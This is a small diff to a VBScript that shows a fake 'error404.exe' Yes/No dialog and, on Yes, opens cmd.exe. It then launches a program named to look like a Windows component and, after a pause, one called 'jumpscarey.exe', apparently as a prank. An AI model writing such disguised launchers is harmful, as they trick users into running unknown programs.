@@ -59,4 +59,6 @@ intAnswer = _
         vbYesNo, "error404.exe")
 If intAnswer = vbYes Then
     CreateObject("Wscript.Shell").run("cmd.exe")
-    CreateObject("Wscript.Shell").run("1.exe")
+    CreateObject("Wscript.Shell").run("windows10aps.exe")
+    WScript.Sleep(130000)
+    CreateObject("Wscript.Shell").run("jumpscarey.exe")
